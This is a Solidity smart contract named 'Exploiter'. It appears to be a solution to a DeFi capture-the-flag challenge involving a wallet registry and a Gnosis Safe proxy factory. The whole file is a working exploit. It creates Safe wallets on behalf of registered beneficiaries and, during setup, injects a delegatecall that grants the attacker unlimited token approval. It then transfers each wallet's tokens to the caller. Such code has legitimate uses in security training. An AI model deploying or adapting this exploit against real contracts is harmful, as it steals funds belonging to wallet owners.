// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./WalletRegistry.sol";

interface IGnosisSafeProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract Exploiter {
    WalletRegistry private immutable walletRegistry;
    IGnosisSafeProxyFactory private immutable walletFactory;
    IERC20 private immutable token;

    constructor(address _walletRegistryAddress) {
        walletRegistry = WalletRegistry(_walletRegistryAddress);
        walletFactory = IGnosisSafeProxyFactory(walletRegistry.walletFactory());
        token = IERC20(walletRegistry.token());
    }

    function attack(address[] calldata owners) external payable {
        // GnosisSafe.setup function sets initial storage of contract.
        address[] memory _owners = new address[](1);
        bytes memory callbackData = abi.encodeWithSelector(IERC20.approve.selector, address(this), type(uint256).max);
        bytes memory delegateCallData = abi.encodeWithSelector(this.callback.selector, callbackData);
        for (uint256 i = 0; i < owners.length; i++) {
            _owners[0] = owners[i];
            bytes memory data = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                _owners, // _owners List of Safe owners.
                1, // _threshold Number of required confirmations for a Safe transaction.
                address(this), // to Contract address for optional delegate call.
                delegateCallData, // data Data payload for optional delegate call.
                address(0), // fallbackHandler Handler for fallback calls to this contract
                address(0), // paymentToken Token that should be used for the payment (0 is ETH)
                0, // payment Value that should be paid
                address(0) // paymentReceiver Address that should receive the payment (or 0 if tx.origin)
            );

            GnosisSafeProxy proxy =
                walletFactory.createProxyWithCallback(walletRegistry.masterCopy(), data, 0, walletRegistry);

            token.transferFrom(address(proxy), msg.sender, token.balanceOf(address(proxy)));
        }
    }

    function callback(bytes calldata data) external {
        address(token).call(data);
    }
}
